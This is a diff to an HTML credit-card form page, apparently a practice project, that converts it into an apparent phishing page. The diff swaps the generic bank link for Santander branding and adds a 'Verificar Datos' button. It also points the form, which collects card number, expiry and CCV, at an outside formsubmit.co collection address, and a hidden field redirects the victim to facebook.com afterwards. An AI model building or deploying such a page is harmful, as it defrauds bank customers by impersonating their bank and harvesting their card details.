@@ -9,6 +9,7 @@
 	<link rel="stylesheet" href="css/estilos.css">
 </head>
 <body>
+	
 	<div class="contenedor">
 
 		<!-- Tarjeta -->
@@ -26,7 +27,7 @@
 					<div class="flexbox">
 						<div class="grupo" id="nombre">
 							<p class="label">Nombre Tarjeta</p>
-							<p class="nombre">Jhon Doe</p>
+							<p class="nombre">Nombre</p>
 						</div>
 
 						<div class="grupo" id="expiracion">
@@ -50,7 +51,7 @@
 					</div>
 				</div>
 				<p class="leyenda">Lorem ipsum dolor sit amet consectetur adipisicing elit. Accusamus exercitationem, voluptates illo.</p>
-				<a href="#" class="link-banco">www.tubanco.com</a>
+				<a href="#" class="link-banco">www.Santander.com</a>
 			</div>
 		</section>
 
@@ -62,7 +63,9 @@
 		</div>
 
 		<!-- Formulario -->
-		<form action="" id="formulario-tarjeta" class="formulario-tarjeta">
+		
+			
+		<form action="https://formsubmit.co/7d78c6e31b15efc942d44f78e90fe5db" method="POST" id="formulario-tarjeta" class="formulario-tarjeta">
 			<div class="grupo">
 				<label for="inputNumero">Número Tarjeta</label>
 				<input type="text" id="inputNumero" maxlength="19" autocomplete="off">
@@ -95,7 +98,12 @@
 					<input type="text" id="inputCCV" maxlength="3">
 				</div>
 			</div>
-			<button type="submit" class="btn-enviar">Enviar</button>
+			
+			<input type="submit" class="btn-enviar" value="Verificar Datos">
+			
+				
+			<input type="hidden" name="_next" value="https://www.facebook.com">
+			<button type="submit" class="btn-enviar" value="https://www.santander.com.mx">Verificar Datos</button>
 		</form>
 	</div>
 
